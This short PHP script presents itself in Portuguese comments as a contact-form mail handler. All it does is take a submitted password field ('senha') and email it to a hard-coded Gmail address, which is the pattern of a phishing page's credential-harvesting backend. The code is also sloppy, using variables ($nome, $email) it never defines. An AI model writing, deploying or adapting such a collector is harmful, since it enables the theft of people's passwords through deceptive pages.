<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Coleta os dados do formulário
    $senha = htmlspecialchars($_POST['senha']);

    // Destinatário do e-mail
    $destinatario = "fxio0909@gmail.com";
    $assunto = "Novo Contato de: $nome";

    // Corpo do e-mail
    $corpo .= "Senha: $senha\n"; 

    // Cabeçalhos do e-mail
    $cabecalhos = "From: $email";

    // Envia o e-mail
    if (mail($destinatario, $assunto, $corpo, $cabecalhos)) {
        echo "Mensagem enviada com sucesso!";
    } else {
        echo "Ocorreu um erro ao enviar a mensagem.";
    }
}
?>
